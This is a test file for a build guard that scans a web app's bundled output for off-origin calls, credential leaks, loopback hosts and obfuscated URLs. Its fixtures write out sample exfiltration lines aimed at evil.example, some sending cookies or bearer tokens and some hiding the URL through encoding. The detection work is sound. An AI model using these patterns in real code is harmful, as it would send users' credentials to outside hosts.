import { describe, expect, it } from 'vitest';
// @ts-expect-error The repo intentionally carries no global Node typings; this
// test exercises the executable guard's stdout/stderr boundary.
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import packageJson from '../package.json';

// The production checker is an executable JavaScript module rather than app code.
// @ts-expect-error No declaration file is needed for this build-time module.
import { apiConfigViolationsIn, violationsIn, decodeObfuscation, emittedViolationsIn, EMITTED_TEXT_EXTENSIONS } from '../scripts/check-no-direct-exposure.mjs';

/**
 * Issue #55, AC2/AC3/AC5.
 *
 * AC2 — the emitted artifact is scanned, not only the source tree.
 * AC3 — credentials, bearer headers, and cookies never attach off-origin.
 * AC5 — coverage for normal imports, dynamic imports, `new URL(..., import.meta.url)`,
 *       CSS URLs, binary/image assets, and obfuscated/encoded URL forms.
 *
 * Only the pure decision is exercised here. The filesystem walk that feeds it is
 * build-time code, and this repository intentionally carries no `@types/node` —
 * the same split as `violationsIn` / `scanDirectExposure` and
 * `privateSiblingLanes` / `privateSiblingArtifacts`.
 */

interface Violation {
  rule: string;
  why: string;
  value: string;
}

declare const process: {
  cwd(): string;
  execPath: string;
};

const rules = (hits: Violation[]): string[] => hits.map((hit) => hit.rule);
const scan = (text: string, only?: Set<string>): Violation[] =>
  emittedViolationsIn(text, 'assets/index-a1b2c3.js', only ?? null) as Violation[];
const GUARD = join(process.cwd(), 'scripts/check-no-direct-exposure.mjs');

function capturedCliOutput(text: string, asset = 'index.js'): string {
  const root = mkdtempSync(join(tmpdir(), 'gw-emitted-redaction-'));
  try {
    mkdirSync(join(root, 'assets'));
    writeFileSync(join(root, 'assets', asset), text);
    const result = spawnSync(process.execPath, [GUARD, '--emitted', root], { encoding: 'utf8' });
    expect(result.status).toBe(1);
    return `${result.stdout}${result.stderr}`;
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', () => {
  it('covers every emitted text form the acceptance criterion names', () => {
    // JavaScript, CSS, HTML, JSON, source maps, workers, and manifests.
    for (const ext of ['.js', '.mjs', '.css', '.html', '.json', '.map', '.webmanifest']) {
      expect(EMITTED_TEXT_EXTENSIONS.has(ext), ext).toBe(true);
    }
  });

  it('rejects a loopback destination that survived bundling', () => {
    // Source scanning cannot see this if a dependency introduced it.
    expect(rules(scan('const u="http://127.0.0.1:8791/api";fetch(u)')))
      .toContain('emitted-loopback-host');
  });

  it('rejects credentials embedded in a bundled URL and never reprints them', () => {
    const hits = scan('fetch("https://svc:hunter2@api.example/v1")');
    expect(rules(hits)).toContain('emitted-url-userinfo');
    expect(hits.every((hit) => !hit.value.includes('hunter2'))).toBe(true);
  });

  it('reports the rule, a safe destination, and the reason on every finding', () => {
    const [hit] = scan('fetch("https://evil.example/collect")');
    expect(hit.rule).toContain('off-origin');
    expect(hit.value).toBe('destination=https://evil.example');
    expect(hit.why).not.toHaveLength(0);
  });

  it('reports one finding per destination, not one per repetition', () => {
    // A minifier repeats the same destination across chunks; a report with
    // hundreds of identical lines is not actionable.
    const repeated = Array.from({ length: 5 }, () => 'fetch("https://evil.example/x")').join(';');
    expect(scan(repeated).filter((hit) => hit.rule.startsWith('emitted-off-origin-dial')))
      .toHaveLength(1);
  });
});

describe('off-origin dial forms (#55 AC5)', () => {
  it('rejects a normal static import of an off-origin module', () => {
    expect(rules(scan('import{a}from"https://cdn.example/pkg.js";')))
      .toContain('emitted-off-origin-module');
  });

  it('rejects a dynamic import of an off-origin module', () => {
    expect(rules(scan('const m=await import("https://cdn.example/late.js")')))
      .toContain('emitted-off-origin-dial');
  });

  it('rejects an off-origin `new URL(..., import.meta.url)` asset reference', () => {
    // Rollup rewrites this form into an emitted local asset. One that still
    // points off-origin was never emitted locally.
    expect(rules(scan('new URL("https://cdn.example/logo.svg",import.meta.url)')))
      .toContain('emitted-off-origin-asset');
  });

  it('rejects an off-origin CSS url()', () => {
    // A third-party font or image load hands every visitor's IP and referrer to
    // that host — a tracking surface the visitor never agreed to.
    expect(rules(scan('@font-face{src:url(https://fonts.example/x.woff2)}')))
      .toContain('emitted-off-origin-css-url');
    expect(rules(scan('.h{background:url("//cdn.example/bg.png")}')))
      .toContain('emitted-off-origin-css-url');
  });

  it('rejects off-origin markup subresources', () => {
    for (const markup of [
      '<script src="https://cdn.example/a.js"></script>',
      '<img srcset="https://cdn.example/a.png 2x">',
      '<form action="https://evil.example/collect">',
      '<link rel="stylesheet" href="https://cdn.example/a.css">',
    ]) {
      expect(rules(scan(markup)), markup).toContain('emitted-off-origin-subresource');
    }
  });

  it('rejects the other browser network sinks', () => {
    for (const sink of [
      'new WebSocket("wss://evil.example/s")',
      'new EventSource("https://evil.example/stream")',
      'navigator.sendBeacon("https://evil.example/t",d)',
      'importScripts("https://evil.example/w.js")',
      'new Worker("https://evil.example/w.js")',
    ]) {
      expect(rules(scan(sink)), sink).toContain('emitted-off-origin-dial');
    }
  });

  it('rejects an off-origin XMLHttpRequest', () => {
    expect(rules(scan('x.open("GET","https://evil.example/v1")')))
      .toContain('emitted-off-origin-xhr');
  });
});

describe('credentials never attach off-origin (#55 AC3)', () => {
  it('names a credentialed off-origin fetch distinctly from a bare one', () => {
    const hits = scan('fetch("https://evil.example/v1",{credentials:"include"})');
    expect(rules(hits)).toContain('emitted-off-origin-dial-credentialed');
    expect(hits.some((hit) => hit.why.includes('credentials'))).toBe(true);
  });

  it('flags a bearer or authorization header sent off-origin', () => {
    expect(rules(scan('fetch("https://evil.example/v1",{headers:{Authorization:"Bearer "+t}})')))
      .toContain('emitted-off-origin-dial-credentialed');
  });

  it('flags a cookie header sent off-origin', () => {
    expect(rules(scan('fetch("https://evil.example/v1",{headers:{Cookie:c}})')))
      .toContain('emitted-off-origin-dial-credentialed');
  });

  it('flags withCredentials on an off-origin XHR, including the minified form', () => {
    expect(rules(scan('x.open("GET","https://evil.example/v1");x.withCredentials=!0')))
      .toContain('emitted-off-origin-xhr-credentialed');
  });

  it('never reprints the credential itself', () => {
    const hits = scan('fetch("https://u:hunter2@evil.example/v1",{credentials:"include"})');
    expect(hits).not.toHaveLength(0);
    expect(hits.every((hit) => !hit.value.includes('hunter2')), JSON.stringify(hits)).toBe(true);
  });

  it('keeps synthetic credential sentinels out of helper findings and CLI output', () => {
    const cases = [
      'const Cookie="SYNTH_COOKIE_7e91";fetch("https://evil.example/v1",{headers:{Cookie}})',
      'const Authorization="Bearer SYNTH_AUTH_7e91";fetch("https://evil.example/v1")',
      'const key="SYNTH_API_KEY_7e91";fetch("https://evil.example/v1",{headers:{"X-Api-Key":key}})',
      'fetch("https://user:SYNTH_USERINFO_7e91@evil.example/v1")',
      'fetch("https:%2f%2fuser:SYNTH_DECODED_7e91@evil.example/v1")',
    ];
    for (const source of cases) {
      const marker = source.match(/SYNTH_[A-Z_0-9]+/)?.[0];
      expect(marker).toBeTruthy();
      const hits = scan(source);
      expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
      expect(JSON.stringify(hits)).not.toContain(marker!);
      const output = capturedCliOutput(source);
      expect(output).toContain('[emitted-off-origin-dial');
      expect(output).not.toContain(marker!);
    }
  });

  it('leaves the correct same-origin credentialed call alone', () => {
    // `src/data/api.ts` and `src/ui/gated-upload.ts` do exactly this. Flagging
    // it would make the guard unusable.
    expect(scan('fetch("/api/intake",{credentials:"include"})')).toHaveLength(0);
    expect(scan('fetch("/api/notifications",{credentials:"same-origin"})')).toHaveLength(0);
  });
});

describe('obfuscated and encoded URL forms (#55 AC5)', () => {
  it('decodes escape and concatenation forms back to a readable URL', () => {
    expect(decodeObfuscation('"htt"+"ps://evil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\/\\/evil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\x2f\\x2fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:\\u002f\\u002fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:%2f%2fevil.example"')).toContain('https://evil.example');
    expect(decodeObfuscation('"https:%252f%252fevil.example"')).toContain('https://evil.example');
  });

  it('leaves a control character encoded rather than splicing the text', () => {
    // Decoding %0a would manufacture a line break that is not in the artifact.
    expect(decodeObfuscation('/api%0aHost:evil')).toContain('%0a');
  });

  it('catches a dial hidden behind each obfuscated form', () => {
    for (const form of [
      'fetch("htt"+"ps://evil.example/x")',
      'fetch("https:\\/\\/evil.example/x")',
      'fetch("https:\\x2f\\x2fevil.example/x")',
      'fetch("https:%2f%2fevil.example/x")',
    ]) {
      expect(rules(scan(form)), form).toContain('emitted-off-origin-dial');
    }
  });

  it('catches an encoded loopback destination', () => {
    expect(rules(scan('const u="http:%2f%2f127.0.0.1:8791/api"')))
      .toContain('emitted-loopback-host');
  });
});

describe('binary and image assets (#55 AC5)', () => {
  const BINARY_ONLY = new Set(['emitted-loopback-host', 'emitted-url-userinfo']);

  it('catches a destination hidden in image or font metadata', () => {
    // A PNG text chunk read as bytes. Only the two never-legitimate shapes are
    // applied, so a byte sequence cannot accidentally look like a dial.
    const png = `\x89PNG\r\n\x1a\ntEXtComment\x00see http://127.0.0.1:8791/api\x00IEND`;
    expect(rules(scan(png, BINARY_ONLY))).toContain('emitted-loopback-host');
  });

  it('does not apply dial rules to binary bytes', () => {
    // `fetch(` appearing inside compressed bytes is noise, not a call site.
    expect(scan('\x00\x01fetch("https://evil.example/x")\x02', BINARY_ONLY)).toHaveLength(0);
  });
});

describe('honest civic data keeps passing (#55)', () => {
  it('does not flag a captured source citation', () => {
    // Fixtures cite real public records and are bundled verbatim. A citation is
    // evidence; only a dial is a destination. Flagging these would fail the
    // build on honest data.
    expect(scan('{"source_url":"https://alpinewy.gov/agenda-2026-04-14.pdf"}')).toHaveLength(0);
    expect(scan('{"archive":"https://web.archive.org/web/2026/https://alpinewy.gov"}'))
      .toHaveLength(0);
  });

  it('does not flag an anchor to a cited public record', () => {
    // `<a href>` is how a citation appears in rendered markup. `<link href>`,
    // `src`, and `action` are loads and stay flagged.
    expect(scan('<a href="https://alpinewy.gov/minutes.pdf" rel="noopener">Minutes</a>'))
      .toHaveLength(0);
  });

  it('does not flag same-origin and data URLs', () => {
    expect(scan('fetch("/api/timeline")')).toHaveLength(0);
    expect(scan('.i{background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)}')).toHaveLength(0);
    expect(scan('.i{background:url("/assets/hero-a1b2.png")}')).toHaveLength(0);
    expect(scan('import{render}from"./chunk-a1b2.js"')).toHaveLength(0);
  });
});

describe('where the emitted scan is enforced (#55 AC2)', () => {
  const scripts = packageJson.scripts as Record<string, string>;

  it('audits the private-beta artifact after it is built', () => {
    expect(scripts['build:private-beta']).toContain('--emitted dist/client');
  });

  it('audits the public artifact after it is built', () => {
    expect(scripts['build:public']).toContain('--emitted dist/public');
  });

  it('audits the final Sites public artifact after building the public graph', () => {
    const sitesBuild = scripts['build:sites-public'];
    expect(sitesBuild).toContain('vite build --mode public --outDir ../dist/client');
    expect(sitesBuild).toContain('--emitted dist/client');
    expect(sitesBuild.indexOf('vite build')).toBeLessThan(
      sitesBuild.indexOf('--emitted dist/client'),
    );
  });

  it('runs the emitted scan after the bundler, not before it', () => {
    // Ordering is the whole point: scanning before `vite build` would read a
    // stale or absent artifact and pass vacuously.
    const publicLane = scripts['build:public'];
    expect(publicLane.indexOf('vite build')).toBeLessThan(publicLane.indexOf('--emitted'));
  });

  it('offers the emitted scan for each lane as its own entry point', () => {
    expect(scripts['check:emitted']).toContain('--emitted dist/client');
    expect(scripts['check:emitted-public']).toContain('--emitted dist/public');
  });
});

describe('diagnostic output boundary (#285)', () => {
  const marker = 'SYNTH_CUTOFF_285';
  it.each([299, 300, 301, 600])('handles complete userinfo beyond %i characters', (size) => {
    const source = `fetch("https://${marker}${'x'.repeat(size)}:password@evil.example/path?token=${marker}")`;
    const hits = scan(source);
    expect(rules(hits)).toContain('emitted-off-origin-dial');
    expect(hits.find((hit) => hit.rule === 'emitted-off-origin-dial')?.value)
      .toBe('destination=https://evil.example');
    expect(JSON.stringify(hits)).not.toContain(marker);
    const output = capturedCliOutput(source);
    expect(output).toContain('[emitted-off-origin-dial]');
    expect(output).not.toContain(marker);
  });
  it('retains distinct loopback and binary userinfo destinations', () => {
    const loopbacks = scan('127.0.0.1:8791 localhost:8100', new Set(['emitted-loopback-host']));
    expect(loopbacks.map((hit) => hit.value)).toEqual([
      'destination=http://127.0.0.1:8791', 'destination=http://localhost:8100',
    ]);
    const userinfo = scan(`https://user:${marker}@one.example/x https://user:${marker}@two.example/y`,
      new Set(['emitted-url-userinfo']));
    expect(userinfo.map((hit) => hit.value)).toEqual([
      'destination=https://one.example', 'destination=https://two.example',
    ]);
    expect(JSON.stringify(userinfo)).not.toContain(marker);
  });
  it('omits adjacent credentials from source and API-config findings', () => {
    const source = `const Cookie="${marker}"; fetch("http://127.0.0.1:8791/path?token=${marker}")`;
    const hits = violationsIn(source, 'src/example.ts') as Violation[];
    expect(rules(hits)).toContain('loopback-host');
    expect(JSON.stringify(hits)).not.toContain(marker);
    const config = apiConfigViolationsIn(`VITE_API_BASE=https://user:${marker}@evil.example/?token=${marker}`) as Violation[];
    expect(rules(config)).toContain('api-config-userinfo');
    expect(JSON.stringify(config)).not.toContain(marker);
  });
  it('exercises the default source/config CLI without printing credentials', () => {
    const root = mkdtempSync(join(tmpdir(), 'gw-source-redaction-'));
    try {
      mkdirSync(join(root, 'scripts'));
      mkdirSync(join(root, 'src'));
      writeFileSync(join(root, 'scripts/check-no-direct-exposure.mjs'), readFileSync(GUARD, 'utf8'));
      writeFileSync(join(root, 'src/example.ts'), `const Cookie="${marker}";fetch("http://127.0.0.1:8791/path")`);
      writeFileSync(join(root, '.env.example'), `VITE_API_BASE=https://user:${marker}@evil.example/?token=${marker}`);
      const result = spawnSync(process.execPath, [join(root, 'scripts/check-no-direct-exposure.mjs')], { encoding: 'utf8' });
      expect(result.status).toBe(1);
      const output = `${result.stdout}${result.stderr}`;
      expect(output).toContain('[loopback-host]');
      expect(output).toContain('[api-config-userinfo]');
      expect(output).not.toContain(marker);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe('userinfo cannot become destination context (#285)', () => {
  it.each(['localhost:12345', '127.0.0.1:12345', '10.20.30.40:12345',
    '192.168.1.23:12345', 'http://localhost:12345', 'https://127.0.0.1:23456',
    'prefix-localhost:12345', 'prefix-10.20.30.40:12345'])('%s stays private inside either userinfo field', (credential) => {
    for (const userinfo of [`SYNTH_USER_285:${credential}`, `${credential}:SYNTH_PASSWORD_285`]) {
      const source = `fetch("https://${userinfo}@evil.example/x")`;
      const hits = scan(source);
      expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
      const sourceHits = violationsIn(source, 'src/example.ts') as Violation[];
      expect(sourceHits.length).toBeGreaterThan(0);
      const binaryHits = scan(source, new Set(['emitted-loopback-host', 'emitted-url-userinfo']));
      expect(binaryHits.length).toBeGreaterThan(0);
      const config = apiConfigViolationsIn(`VITE_API_BASE=https://${userinfo}@evil.example/x`) as Violation[];
      expect(config.length).toBeGreaterThan(0);
      for (const report of [hits, sourceHits, binaryHits, config]) {
        const output = JSON.stringify(report).toLowerCase();
        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
          expect(output).not.toContain(secret.toLowerCase());
        }
      }
      for (const asset of ['index.js', 'metadata.png']) {
        const output = capturedCliOutput(source, asset).toLowerCase();
        expect(output).toContain('[emitted-');
        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
          expect(output).not.toContain(secret.toLowerCase());
        }
      }
    }
  });
});

describe('encoded and binary diagnostic output (#285)', () => {
  const encodedCharacters = Array.from({ length: 95 }, (_, index) => index + 32)
    .flatMap((code) => {
      const hex = code.toString(16).padStart(2, '0');
      return [`%${hex}`, `%25${hex}`, String.raw`\x${hex}`, String.raw`\u00${hex}`];
    });
  it.each(encodedCharacters)('keeps encoded character %s out of reported authority', (encoded) => {
    const marker = 'SYNTH_USER_285';
    const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
    const hits = scan(source);
    expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
    expect(JSON.stringify(hits).toLowerCase()).not.toContain(marker.toLowerCase());
    const binary = scan(source, new Set(['emitted-url-userinfo']));
    expect(binary.length).toBeGreaterThan(0);
    expect(JSON.stringify(binary).toLowerCase()).not.toContain(marker.toLowerCase());
  });
  it.each(['%20', '%22', '%27', '%60', '%29', '%3e', String.raw`\x22`, String.raw`\u0020`])(
    'omits decoded delimiter %s from emitted and binary CLI output', (encoded) => {
      const marker = 'SYNTH_USER_285';
      const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
      for (const asset of ['index.js', 'metadata.png']) {
        const output = capturedCliOutput(source, asset);
        expect(output).toMatch(/\[emitted-(off-origin-dial|url-userinfo)/);
        expect(output.toLowerCase()).not.toContain(marker.toLowerCase());
      }
    },
  );
  it.each(['%2f', '%252f', '%5c', String.raw`\x2f`, String.raw`\u002f`])(
    'never reinterprets userinfo containing %s as a hostname', (separator) => {
      const marker = 'SYNTH_USER_285';
      const url = `https://${marker}${separator}:password@evil.example/x`;
      const source = `fetch("${url}")`;
      const hits = scan(source);
      expect(rules(hits)).toContain('emitted-off-origin-dial');
      expect(JSON.stringify(hits).toLowerCase()).not.toContain(marker.toLowerCase());
      const output = capturedCliOutput(source);
      expect(output).toContain('[emitted-off-origin-dial]');
      expect(output.toLowerCase()).not.toContain(marker.toLowerCase());
      const config = apiConfigViolationsIn(`VITE_API_BASE=${url}`) as Violation[];
      expect(rules(config).some((rule) => rule.startsWith('api-config-'))).toBe(true);
      expect(JSON.stringify(config).toLowerCase()).not.toContain(marker.toLowerCase());
      const sourceHits = violationsIn(source, 'src/example.ts') as Violation[];
      if (separator.startsWith('%')) expect(rules(sourceHits)).toContain('url-userinfo');
      expect(JSON.stringify(sourceHits).toLowerCase()).not.toContain(marker.toLowerCase());
      const root = mkdtempSync(join(tmpdir(), 'gw-separator-redaction-'));
      try {
        mkdirSync(join(root, 'scripts'));
        mkdirSync(join(root, 'src'));
        writeFileSync(join(root, 'scripts/check-no-direct-exposure.mjs'), readFileSync(GUARD, 'utf8'));
        writeFileSync(join(root, 'src/example.ts'), source);
        writeFileSync(join(root, '.env.example'), `VITE_API_BASE=${url}`);
        const result = spawnSync(process.execPath, [join(root, 'scripts/check-no-direct-exposure.mjs')], { encoding: 'utf8' });
        expect(result.status).toBe(1);
        const defaultOutput = `${result.stdout}${result.stderr}`;
        if (separator.startsWith('%')) expect(defaultOutput).toContain('[url-userinfo]');
        expect(defaultOutput).toMatch(/\[api-config-[a-z-]+\]/);
        expect(defaultOutput.toLowerCase()).not.toContain(marker.toLowerCase());
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
      const binary = capturedCliOutput(url, 'metadata.png');
      expect(binary).toContain('[emitted-url-userinfo]');
      expect(binary.toLowerCase()).not.toContain(marker.toLowerCase());
    },
  );
  it('keeps long encoded userinfo out of helper and emitted CLI diagnostics', () => {
    const marker = 'SYNTH_ENCODED_285';
    const source = `fetch("https:%2f%2f${marker}${'x'.repeat(600)}:password@evil.example/x")`;
    const hits = scan(source);
    expect(rules(hits)).toContain('emitted-off-origin-dial');
    expect(hits.find((hit) => hit.rule === 'emitted-off-origin-dial')?.value)
      .toBe('destination=off-origin');
    expect(JSON.stringify(hits)).not.toContain(marker);
    const output = capturedCliOutput(source);
    expect(output).toContain('[emitted-off-origin-dial]');
    expect(output).not.toContain(marker);
  });
  it('reports both binary origins and loopback ports without retaining userinfo', () => {
    const marker = 'SYNTH_BINARY_285';
    const source = `\x00https://user:${marker}@one.example/x https://user:${marker}@two.example/y 127.0.0.1:8791 localhost:8100\x00`;
    const output = capturedCliOutput(source, 'metadata.png');
    for (const destination of ['https://one.example', 'https://two.example', 'http://127.0.0.1:8791', 'http://localhost:8100']) {
      expect(output).toContain(`destination=${destination}`);
    }
    expect(output).toContain('[emitted-url-userinfo]');
    expect(output).toContain('[emitted-loopback-host]');
    expect(output).not.toContain(marker);
  });
});
